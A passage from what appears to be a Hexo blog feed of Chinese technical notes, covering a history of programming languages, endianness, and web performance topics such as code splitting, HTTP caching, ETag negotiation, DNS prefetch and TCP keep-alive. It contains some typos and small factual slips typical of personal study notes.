Objective-C 一样，他们是在 C 的基础上加了很多的东西，或者说是拓展、升级。而方言就是语法几乎没有变，只是改变了一下意思（比如说单词）</p></blockquote><ul><li><strong>Self</strong>，1987年，面向对象刚开始并没有怎么去面向对象，只是说了对象和对象之间有消息传递。但像 C++ 就是说我们必须要有 class，接口之类的。而 Self 认为并不一定得有 Class 这些，我们可以用<strong>原型</strong>。</li><li>R，1993年，主要用于科学计算。</li><li>lua，1993年，本来很火，后来因为 Node.js被压下去了一点，特别适合用于给游戏写脚本，比较灵活。</li><li>Erlang，1986年，比较强调分布式的语言，现在也不多了，为什么？因为有了 Golang（即使是抄过来的）。</li><li>Haskell，1990年，这个语言当时是十几个人一起开发的，投票选出来的名字。从 Lisp（lambda 演算为基础发展而来，标志就是 “λ”） 这一脉。</li></ul><blockquote><p>这么看下来好像函数式式微，没关系，在前端这里起来了。<br>但是从 1990 年开始，事情开始变化，语言突然开始变多了。</p></blockquote><ul><li>Python，1991年，走的面向对象（smallTalk），指令式（c 语言）这一脉。那个时候也主要是用来写脚本。大概 2015 的时候火了，很多公司突然开始搞大数据，因为很多科学计算的库。</li><li>Perl 5，1994年，1991年那个时候万维网诞生了，也就是需要前端、后端，一般新起的领域都需要新的语言来，因为他需要单独为这个领域做一些事情。最早最早于用 C 在做开发，但是因为开发效率太低了，所以有了 Perl 第五版语言，特点是有很多的正则。</li><li>PHP 3，1998年，这个在中国被广泛使用，当时如果你要做后端就大概率话选择这个，很大的原因可能是在于对中文的支持，像 unicode、GBK，都是 1995年以后出来的，不然如果是写页面，为什么不用更成熟的 Perl 或者 Python等，而选择这么新的 PHP。</li><li>Racket，1995年，属于Lisp家族的函数式程序设计语言。</li><li><strong>Ruby</strong>，1995年，如果是 web 编程，这个也是可以用。在中国没有火起来，因为他的定位和 PHP 一样，都是 Web 后端。但 Ruby 的教程就几乎为零，所以入行的人也少了，入行的人少了教程就更少了，恶性循环，不像 PHP 选择的人多。这也就像 MySQL一样，和同时期或者后起来的数据库相比真不怎么样，各方面都排不到前三，除了流行度就是因为网上搜数据库的教程基本上都是 MySQL。还有就是因为 LAMP 这套组合（Linux+Apache+MySQL+PHP）。前端也总结了一套有 MEAN（MogoDB+Express+Angular+Nginx），为什么 Angular 也很火，因为他加入了这套组合拳，所以他也很流行。</li></ul><blockquote><p>所以一门技术要流行，一是名字要取得好，像 MySQL，简单的、短小，大家一看就记下来了。二是要和流行的技术打包。<br>JS 深的这种体会，傍了 JAVA</p></blockquote><ul><li><p>Java，1995年，基于 class 的面向对象，而且 Java Spring 太好用了。</p></li><li><p>Java Script，1995年，他是抄袭最多的语言（因为只有 10 人的时间），需要有指令式(if else 之类的)的语言（C 语言），原型（Self），函数式(函数是一等公民，函数可以像变量一样传来传去)编程（Scheme），JAVA（必须，Kpi 任务，10天，必须像 JAVA），但是呢。JS 之父喜欢函数式那套，所以一开始这们语言就是四不像，有点像函数式但又差远了，有点像面向对象但也差远了。所以那个时候大家都是随便写写，从 1995-2005 这年间，没有人专门去学这种“缝合怪”的东西。</p></li><li><p>C#，2000年，<strong>如果一个语言出来的比较早，那他的库一定很多，如果一个语言出来的比较慢，那他一定设计比较好</strong>，这门语言基本上是照着 JAVA 设计的，并且改了很多不好的地方，在面向对象的实现上比 JAVA 好很多，既可以做桌面应用，也可以写 Web。</p></li><li><p>LINQ，2007年，一项技术，适用于 C#，他结合了 SQL 和 Haskell，用函数式编程的想法去写 SQL。</p></li><li><p>Rx 库，2011年，他受到 LINQ 的启发，除了搞 SQL 还可以搞其他的，那么所有跟事件相关的东西都可以用 Rx 来操作，并且是以流的方式。Angular 中 Rx 就是重要的章节。有衍生出 Rx.js，Rx.java。</p></li></ul><blockquote><p>面向对象和 MVC 的特点，适合于 UI 编程，但是 JS 不止界面还有处理事件，面向对象不好处理事件，事件一般都是异步的，像 JAVA 处理异步要么用线程、事件委托等都搞不好，线程还会涉及到锁，所以函数式火了起来，阴差阳错，本来是四不像，现在好像用来处理事件不错。</p></blockquote><ul><li>TypeScript，2012年，微软发明的 JavaScript 超集。</li><li>Golang，2009年，谷歌，主要用于分布式、云系统，可能借鉴了 Erlang。</li><li>Dart，2012年，谷歌为了 Flutter 跨平台 UI 需求发明。</li><li>kotlin，2011年，JetBrains 主要是为了升级 JAVA，宣传语-修复 null，空值之类的错误。如果现在用来开发安卓应用，不会在选择 JAVA 了，而是选择他。</li><li>Clojure，2007年，JAVA 和函数式的融合。</li><li>Swift，2014年，苹果升级了 Objective-C，为了跨平台需求（电脑、手机和手表）。</li><li>Hack，2014年，Facebook 升级了 PHP。最近又被 JS 抄了 pipe 语法。</li><li>Rust，2010年，Mozilla 有一个 Firefox 浏览器，但是是用 C++ 写的，但这个浏览器 10~20 的版本卡的要死，如果直接去改(优化) C++ 还不如搞个新的语言。<strong>虽然这里可以用 C++ 重写程序也能优化，但是不如发明一个新的语言去推动重写，这样也有利于宣传</strong>。在前端 webpack 的 babel-loader 太慢了，可以用 rust 加快100倍（<a href="https://swc.rs/docs/benchmarks#es3-1">swc</a>）或者 esBuild。主要用于系统编程。</li></ul><blockquote><p>到现在那些 199x年的语言，到现在 30 年了，都到了瓶颈，所以一门语言都是有生命实效的，不可能一直存活，因为需求变了，语言的诞生就是为了某个需求。</p></blockquote><p>·<br>题外话：<br>现在的编程知识就像上面的那个图一样，像个树一样的东西，慢慢生长的，目前学的 JavaScript 已经在很后面了，直接在这里开始学，前后左右都是很复杂的东西(也积淀他是抄袭王)，一般没有写 JavaScript 的人去学 C++、Golang、Java 这种，一般走不出去，那要怎么才能突破呢？从最上面开始学，慢慢学到 JavaScript 时，会发现这东西不就是上面组合而成的。</p><p>语言切换是很简单的，思维模型不一样，如果用 typescript 就得思考类型，还有库不一样，如果一个语言能调用以前的库就很好，还有工具链能否继续支持，</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大端模式和小端模式</title>
      <link href="/Blog/2021/12/23/essay/%E5%A4%A7%E7%AB%AF%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E6%A8%A1%E5%BC%8F/index/"/>
      <url>/Blog/2021/12/23/essay/%E5%A4%A7%E7%AB%AF%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E6%A8%A1%E5%BC%8F/index/</url>
      
        <content type="html"><![CDATA[<h3 id="大端模式"><a href="#大端模式" class="headerlink" title="大端模式"></a>大端模式</h3><p>大端模式（Big-Endian）又称大端字节序，由于在网络传输中一般使用的是大端模式，所以也叫网络字节序。</p><p>在大端模式中，将高位字节放在低位地址，低位字节放在高位地址。</p><p>举个例子，数值 <code>0x12345678</code>，其中 <code>0x12</code> 这一端是高位字节，<code>0x78</code> 这一端是低位字节。</p><p>该数值的存储顺序是这样的：</p><p><img src="/Blog/2021/12/23/essay/%E5%A4%A7%E7%AB%AF%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E6%A8%A1%E5%BC%8F/index/img.png"></p><p>大端模式符合我们阅读和书写的方式，都是从左到右的。比如 <code>12345678</code>，我们只需要按照从左到右的顺序进行阅读和书写就是大端模式的存储顺序了。</p><h3 id="小端模式"><a href="#小端模式" class="headerlink" title="小端模式"></a>小端模式</h3><p>小端模式（Little-Endian）又称小端字节序，由于大多数计算机内部处理使用的是小端模式，所以也叫主机序。</p><p>在小端模式中，将高位字节放在高位地址，低位字节放在低位地址。</p><p><img src="/Blog/2021/12/23/essay/%E5%A4%A7%E7%AB%AF%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E6%A8%A1%E5%BC%8F/index/img_1.png"></p><p>小端模式比较符合我们人类的思维模式，大的放大的那一边，小的放小的那一边。但是在计算机中存储的顺序与我们看到的顺序是相反的。</p><h3 id="为什么会有大-x2F-小端模式"><a href="#为什么会有大-x2F-小端模式" class="headerlink" title="为什么会有大&#x2F;小端模式"></a>为什么会有大&#x2F;小端模式</h3><p>对于早期的计算机来说，先处理低位字节效率比较高，因为计算都是从低位开始的，所以大多数计算机内部处理使用的是小端模式。但是计算机发展到现在，计算机的处理器相较于以前已经进步很多了，先处理高位还是低位字节的影响已经可以忽略，但是为了向后兼容，保留了大&#x2F;小端模式。</p><p>大小端模式各有优势：小端模式强制转换类型时不需要调整字节内容，直接截取低字节即可；大端模式由于符号位为第一个字节，很方便判断正负。</p><p>大端模式更适合程序员阅读，因为看到的内容与输出的内容是一致的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>计算机在处理数据的时候，只会按照顺序去读取字节，不关心数据是大端模式还是小端模式。</p><p>程序在读取到数据后，需要判断计算机的大小端模式，来决定是否需要进行大小端转换。</p><p>如果读到的第一个字节是高位字节，那么就是大端模式；反之，如果读到的第一个字节是低位字节，那么就是小端模式。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web性能优化-代码优化</title>
      <link href="/Blog/2021/09/09/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96/index/"/>
      <url>/Blog/2021/09/09/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%A3%E7%A0%81%E4%BC%98%E5%8C%96/index/</url>
      
        <content type="html"><![CDATA[<h2 id="代码位置优化"><a href="#代码位置优化" class="headerlink" title="代码位置优化"></a>代码位置优化</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line"> <span class="string">//</span> css <span class="string">....</span></span><br><span class="line">&lt;<span class="string">/head</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="string">//</span> js <span class="string">...</span></span><br><span class="line">&lt;<span class="string">/body</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.jianshu.com/p/20f95a0daca3">上文说到</a>，CSS 要放在上面，JS 要放到下面，因为一些阻塞关系</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">            <span class="selector-tag">HTML</span></span><br><span class="line">不会相互影响/    \相互阻塞</span><br><span class="line">        CSS ————— JS</span><br><span class="line">           相互阻塞</span><br></pre></td></tr></table></figure><ul><li>CSS 为什么放在上面？</li></ul><ol><li>不阻塞 HTML 解析，尽早下载</li><li>防止被外部 JS 阻塞（虽然和 JS 是相互阻塞关系，但是对于用户来说要先看到界面的样子，如果先加载 JS 那么界面可能会白屏、闪烁）</li></ol><ul><li>JS 为什么放在下面？</li></ul><ol><li>可以直接访问 DOM，无须监听 DOM Ready</li><li>避免阻塞 HTML 解析</li></ol><blockquote><p>内联 JS 放在哪里？最上面，越快执行越好</p></blockquote><h2 id="代码拆分（Code-Split）"><a href="#代码拆分（Code-Split）" class="headerlink" title="代码拆分（Code Split）"></a>代码拆分（Code Split）</h2><ul><li>JS</li></ul><ol><li>runtime-xxx.js &#x2F;&#x2F; webpack 提供的库（里面有 require 等）</li><li>rendor-xxx.js &#x2F;&#x2F; 第三方库（Vue、Vuex 等）</li><li>common-xxx.js &#x2F;&#x2F; 共用 JS</li><li>page-index-xxx.js &#x2F;&#x2F; 每个页面的 JS</li></ol><ul><li>CSS</li></ul><ol><li>reset &#x2F; normolize.css</li><li>rendor-xxx.css</li><li>common-xxx.css</li><li>page-index-xxx.css</li></ol><p><a href="https://www.jianshu.com/p/81e4af80f27d">具体配置在这里</a></p><h2 id="JS-动态导入"><a href="#JS-动态导入" class="headerlink" title="JS 动态导入"></a>JS 动态导入</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const<span class="built_in"> array </span>= [1, 2, 3]</span><br><span class="line">import(&#x27;lodash&#x27;).then(_ =&gt; &#123;</span><br><span class="line"> <span class="built_in"> const </span>clone = _.cloneDeep(array)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> https://cn.vuejs.org/v2/guide/components-dynamic-<span class="keyword">async</span>.html</span><br><span class="line">const router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;path: <span class="string">&#x27;/x&#x27;</span>, component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;./xxx.vue&#x27;</span>)&#125;</span><br><span class="line">    &#123;path: <span class="string">&#x27;/&#x27;</span>, component: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;</span><br><span class="line">      component: <span class="keyword">import</span>(<span class="string">&#x27;./xxx.vue),</span></span><br><span class="line"><span class="string">      loading: LoadingComponent,</span></span><br><span class="line"><span class="string">      error: ErrorComponent,</span></span><br><span class="line"><span class="string">    &#125;)&#125;  </span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;)</span></span><br></pre></td></tr></table></figure><h2 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;placeholder.png&quot;</span> <span class="attribute">data-src</span>=<span class="string">&quot;product.jpg&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="预加载"><a href="#预加载" class="headerlink" title="预加载"></a>预加载</h2><blockquote><p>比如图片懒加载时，用户滚动过快还是加载过慢，所以当用户快滚到的时候就提前开始加载<br>或者像 UC 浏览器一样，看小说的时候，在点击下一页之前，就提前加载好下一页内容</p></blockquote><h2 id="CSS-优化技巧"><a href="#CSS-优化技巧" class="headerlink" title="CSS 优化技巧"></a>CSS 优化技巧</h2><ol><li>删除无用的 CSS（使用 webpack 的插件或者 Coverage 工具找到无用的代码，<strong>不推荐这种优化，无法确保正确删除</strong>）</li><li>使用更高效的选择器（即使 <code>*</code> 通配符不高效，但是这已经是十几年钱的技术了，浏览器早就优化了，只有当写出 <code>* * div *</code> 这种才会导致低效）</li><li>减少重拍（reflow &#x2F; relayout）</li><li>不要使用 @import url.css （因为这是串行，会阻塞下面的 CSS，直接用 Link 标签并行加载）</li><li>启用 GPU 硬件加速（transform: translate3d(0,0,0); 这行代码不会对元素产生任何影响，但是当有动画的时候会有 GPU 加速）</li><li>使用缩写（#ffffff &#x3D;&gt; #ff，0.1 &#x3D;&gt; .1，0px &#x3D;&gt; 0）</li><li>看需求，减少无意义的动画，一般动画用户看了三次以后就会看腻</li></ol><h2 id="JS-优化技巧"><a href="#JS-优化技巧" class="headerlink" title="JS 优化技巧"></a>JS 优化技巧</h2><ol><li>尽量不用全局变量（因为全局变量太多会使变量查找变慢）</li><li>尽量少操作 DOM（比如说 10 个节点不要一个一个插入，而是一次性插入）</li><li>不要往页面插入大量的 HTML（分片插入，比如 facebook Fiber 等）</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web性能优化-总结</title>
      <link href="/Blog/2021/09/09/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E6%80%BB%E7%BB%93/index/"/>
      <url>/Blog/2021/09/09/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E6%80%BB%E7%BB%93/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2021/09/09/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E6%80%BB%E7%BB%93/index/img.png"></p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web性能优化-缓存与内容协商</title>
      <link href="/Blog/2021/09/08/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E7%BC%93%E5%AD%98%E4%B8%8E%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86/index/"/>
      <url>/Blog/2021/09/08/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E7%BC%93%E5%AD%98%E4%B8%8E%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86/index/</url>
      
        <content type="html"><![CDATA[<h2 id="1-HTTP-缓存"><a href="#1-HTTP-缓存" class="headerlink" title="1. HTTP 缓存"></a>1. HTTP 缓存</h2><h3 id="DNS-缓存"><a href="#DNS-缓存" class="headerlink" title="DNS 缓存"></a>DNS 缓存</h3><blockquote><p>假设访问了百度，我们需要知道他的 ip 地址<br>首先浏览器会问 <code>windows</code>，如果不知道会问电信要，电信就会返回给浏览器，此时浏览器会缓存下来（一般是一天），然后在返回给浏览器，浏览器也会缓存下来（一般是几分钟）</p></blockquote><h3 id="HTTP-缓存"><a href="#HTTP-缓存" class="headerlink" title="HTTP 缓存"></a>HTTP 缓存</h3><p>在响应头中加入：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Cache</span><span class="params">-Control</span>: <span class="keyword">public</span>, <span class="keyword">max</span><span class="params">-age</span>=<span class="number">3600</span>, must<span class="params">-revalidate</span> </span><br></pre></td></tr></table></figure><p><img src="/Blog/2021/09/08/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E7%BC%93%E5%AD%98%E4%B8%8E%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86/index/img.png"></p><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><ol><li>public – 公开内容，服务器和客户端之间的所有代理都能对文件缓存，与之相反 private，只有客户端能缓存</li><li>max-age – 缓存时间</li><li>must-revalidate – 必须重新校验（这个校验就叫做内容协商）</li></ol><h2 id="2-HTTP-内容协商"><a href="#2-HTTP-内容协商" class="headerlink" title="2. HTTP 内容协商"></a>2. HTTP 内容协商</h2><p>缓存过期以后还能重用吗？</p><h3 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h3><p>在响应头中加入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ETag: xxx <span class="regexp">//</span> 比如文件的 MD5</span><br></pre></td></tr></table></figure><blockquote><p>当文件缓存失效的时候，客户端就会发起请求，这次就不是普通请求了，而是协商请求，要带上之前的 ETag<br>此时服务器会检查文件是否有变化，如果没有变化则返回 304 同时有一个空的响应，否则 200 和新文件的响应1<br>这样浏览器就知道要<strong>删除或者覆盖</strong>之前的缓存（而不是延用之前的），什么时候覆盖，什么时候删除呢？如果响应头里还有 Cache-Control 那就是覆盖，如果 Cache-Control&#x3D;0 则是删除</p></blockquote><h3 id="VS"><a href="#VS" class="headerlink" title="VS ."></a>VS .</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">-----------------------------------------------------------------------------------</span></span><br><span class="line"><span class="code">|          | 缓存 (强缓存)                     | 内容缓存 (弱缓存)                  |</span></span><br><span class="line"><span class="code">-----------------------------------------------------------------------------------</span></span><br><span class="line">| HTTP/1.1 | Cache-Control: max-age=3600, ... | 请求头: If-None-Match: ABC         |</span><br><span class="line"><span class="section">| HTTP/1.1 | ETag: ABC                        | 响应: 304 + 空 / 200 + 新内容      |</span></span><br><span class="line"><span class="section">-----------------------------------------------------------------------------------</span></span><br><span class="line">| HTTP/1.0 | Expire: 时间点A                  | 请求头: If-Modified-Since: 时间点 B |</span><br><span class="line">| HTTP/1.0 | Last-Modified: 时间点B           | 响应: 304 <span class="code">+ 空 / 200 +</span> 新内容       |</span><br></pre></td></tr></table></figure><h2 id="3-服务器禁用缓存"><a href="#3-服务器禁用缓存" class="headerlink" title="3. 服务器禁用缓存"></a>3. 服务器禁用缓存</h2><p>问：如果不加 Cache-Control，浏览器还会缓存吗？<br>答：会</p><blockquote><p>Get 请求一般会被缓存，例如 <strong>200，203（非权威信息），206（部分内容），300（多种选择），301（永久重定向），400（已迁移）</strong>都会被浏览器缓存下来</p></blockquote><p>就算我们不加 Cache-Control 也会被浏览器缓存下来，所以有些时候我们需要手动禁用缓存</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cache-Cintrol: max-age=<span class="number">0</span>, must-revalidate</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span> 表示到达浏览器后就当场失效，</span><br><span class="line"><span class="regexp">//</span> must-revalidate 表示缓存失效以后可以用来协商</span><br></pre></td></tr></table></figure><p>根据 MDN 说法，相当于如下写法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Cache</span>-Cintrol: no-<span class="keyword">cache</span></span><br></pre></td></tr></table></figure><p>最为严格的写法，在加上如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Cintrol: no-store <span class="regexp">//</span> 表示不允许协商</span><br></pre></td></tr></table></figure><h2 id="4-浏览器禁用缓存"><a href="#4-浏览器禁用缓存" class="headerlink" title="4. 浏览器禁用缓存"></a>4. 浏览器禁用缓存</h2><ol><li>加上随机数</li></ol><ul><li>&#x2F;xxxx?random&#x3D;xxx</li></ul><ol start="2"><li>在请求头中加入</li></ol><ul><li>xhr.setRequestHeader(‘Cache-Control’, ‘no-cache, no-store, max-age&#x3D;0’)</li></ul><h2 id="5-Pragma（过时）"><a href="#5-Pragma（过时）" class="headerlink" title="5. Pragma（过时）"></a>5. Pragma（过时）</h2><p>是一个在 HTTP&#x2F;1.0 中规定的通用首部，这个首部的效果依赖于不同的实现，所以在“请求-响应”链中可能会有不同的效果。它用来向后兼容只支持 HTTP&#x2F;1.0 协议的缓存服务器，那时候 HTTP&#x2F;1.1 协议中的 Cache-Control 还没有出来。</p><blockquote><p>由于 Pragma 在 HTTP 响应中的行为没有确切规范，所以不能可靠替代 HTTP&#x2F;1.1 中通用首部 Cache-Control，尽管在请求中，假如 Cache-Control 不存在的话，它的行为与 Cache-Control: no-cache 一致。建议只在需要兼容 HTTP&#x2F;1.0 客户端的场合下应用 Pragma 首部。</p></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pragma: <span class="keyword">no</span>-<span class="keyword">cache</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web性能优化-什么是连接复用</title>
      <link href="/Blog/2021/08/27/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/index/"/>
      <url>/Blog/2021/08/27/javascript/Web%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96-%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9E%E6%8E%A5%E5%A4%8D%E7%94%A8/index/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-性能指标"><a href="#Web-性能指标" class="headerlink" title="Web 性能指标"></a>Web 性能指标</h2><h4 id="web-性能优化到底在优化什么？"><a href="#web-性能优化到底在优化什么？" class="headerlink" title="web 性能优化到底在优化什么？"></a>web 性能优化到底在优化什么？</h4><blockquote><p>你可能会说优化的是用户体验，但用户体验是不可测量的，我们必须把用户体验变成可测量的指标，这些指标包括：</p></blockquote><ol><li>用户按下回车</li><li>由内容出现时（一般3秒之内还没有内容出现，用户就会比较焦虑，会关掉页面）</li><li>DOM ready 事件发生（dom content loading ，代表 HTML 内容全部解析完，js 也基本执行完了，但并不保证图片已经全部加载和 css 样式加载完，就是 network 里面那跟蓝色的线）</li><li>页面可交互（JS 都执行了，并且把事件都绑定了，用户点击按钮不会出现没反应的情况）</li><li>onLoad 事件发生</li><li>动态资源加载完毕</li></ol><h2 id="DNS-prefetch"><a href="#DNS-prefetch" class="headerlink" title="DNS prefetch"></a>DNS prefetch</h2><h4 id="DNS-预解析"><a href="#DNS-预解析" class="headerlink" title="DNS 预解析"></a>DNS 预解析</h4><blockquote><p>假设 index.html 的部分代码为：</p><script src="http://a.com/1.js"></script><script src="http://b.com/1.js"></script></blockquote><blockquote><p>那么过程就是首先对 a.com 进行 dns 查询 &#x3D;&gt; 拿到 ip 地址以后 &#x3D;&gt; 下载a.js &#x3D;&gt; 对 b.com 进行 dns 查询（一定会等 a.js 下载执行完毕后才开始） &#x3D;&gt; 拿到 ip 地址以后 &#x3D;&gt; 下载b.js<br>如果 a.com 和 b.com 同时先进行 dns 预解析，那么就能节省一定的时间</p></blockquote><h4 id="优化（两种方法）"><a href="#优化（两种方法）" class="headerlink" title="优化（两种方法）"></a>优化（两种方法）</h4><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link ref<span class="operator">=</span><span class="string">&quot;des-prefetch&quot;</span> href<span class="operator">=</span><span class="string">&quot;https://a.com/&quot;</span> &gt;</span><br><span class="line">&lt;link ref<span class="operator">=</span><span class="string">&quot;des-prefetch&quot;</span> href<span class="operator">=</span><span class="string">&quot;https://b.com/&quot;</span> &gt;</span><br></pre></td></tr></table></figure><h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> index.html 的响应头里写</span><br><span class="line">Link: &lt;http:<span class="regexp">//</span>a.com /&gt;; rel=dns=prefetch</span><br></pre></td></tr></table></figure><h2 id="TCP-连接复用"><a href="#TCP-连接复用" class="headerlink" title="TCP 连接复用"></a>TCP 连接复用</h2><blockquote><p>正常流程：开启 TCP &#x3D;&gt; 请求 &#x3D;&gt; 响应 &#x3D;&gt; 关闭 &#x3D;&gt; 开启 TCP….<br>可以发现一直在重复开启关闭，为何不复用呢，开启后就不关闭了，节约多次重复开启关闭的时间。</p></blockquote><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求头</span></span><br><span class="line"><span class="symbol">Connection:</span> <span class="meta">keep</span>-alive</span><br></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 响应头</span></span><br><span class="line"><span class="symbol">Connection:</span> <span class="meta">keep</span>-alive</span><br></pre></td></tr></table></figure><blockquote><p>但是如果服务器一直开着将会非常占用资源，用户一多，服务器就顶不住了，所以一般都会在设置一个超时时间，如果超过多少秒还没有再次发起连接，那么将会强制关闭。</p></blockquote> <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求头</span></span><br><span class="line">KeepAlive: timeout=<span class="number">5</span>, <span class="built_in">max</span>=<span class="number">10</span></span><br></pre></td></tr></table></figure> <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 响应头</span></span><br><span class="line">KeepAlive: timeout=<span class="number">10</span>, <span class="built_in">max</span>=<span class="number">100</span></span><br></pre></td></tr></table></figure><blockquote><p>客户端和服务器都可以设置这个字段，两者可以不一样，timeout 表示多少秒，max 表示多少次，一般来说聪明的浏览器会以服务器为准（尊重服务器的能力），而傻一点的浏览器（如：IE）就坚持自己为准</p></blockquote><h5 id="前端怎么加-keep-alive？"><a href="#前端怎么加-keep-alive？" class="headerlink" title="前端怎么加 keep-alive？"></a>前端怎么加 keep-alive？</h5><blockquote><p>如果用的 http&#x2F;1.1 以上，会自动加。<br>也就是基本上不用去优化了。</p></blockquote><h2 id="并行化连接"><a href="#并行化连接" class="headerlink" title="并行化连接"></a>并行化连接</h2><blockquote><p>因为连接复用是串行的，当同时处理多个请求的时候还是太慢，所以需要并行连接。<br>也就是说同时建立好几个请求（一般浏览器会设置最大数量，同一个域名一般 4-12 个）<br><strong>那么连接复用就没有用了吗？</strong><br>答案是<strong>不会</strong>，因为浏览器设置了连接上限，如果超出的连接数，那么剩下的就会等待上一个请求结束后再进行复用。</p></blockquote><p>🌰：</p><p><img 